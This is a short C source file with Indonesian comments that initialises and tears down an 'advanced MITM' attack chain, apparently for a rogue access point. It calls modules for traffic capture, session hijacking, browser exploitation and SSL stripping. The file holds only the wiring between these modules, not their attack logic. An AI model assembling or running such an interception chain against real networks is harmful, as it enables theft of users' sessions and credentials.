// ============================================================================
// IMPLEMENTASI: mitm/advanced_mitm.c — Inisialisasi Fitur MITM Terpadu
// ============================================================================
#include "advanced_mitm.h"
#include "capture.h"
#include "session_hijack.h"
#include "browser_exploit.h"
#include "../server/ssl_strip.h"
#include "../filter/filter.h"
#include "../utils/logger.h"

int advanced_mitm_init(ap_config_t *cfg) {
    capture_init();
    session_hijack_init();
    browser_exploit_init(NULL);
    ssl_strip_init();
    filter_init();
    log_event(LOG_INFO, "Rantai Serangan Advanced MITM Berhasil Diinisialisasi");
    return 0;
}

void advanced_mitm_cleanup(void) {
    capture_cleanup();
    session_hijack_cleanup();
    browser_exploit_cleanup();
    ssl_strip_cleanup();
    filter_cleanup();
}
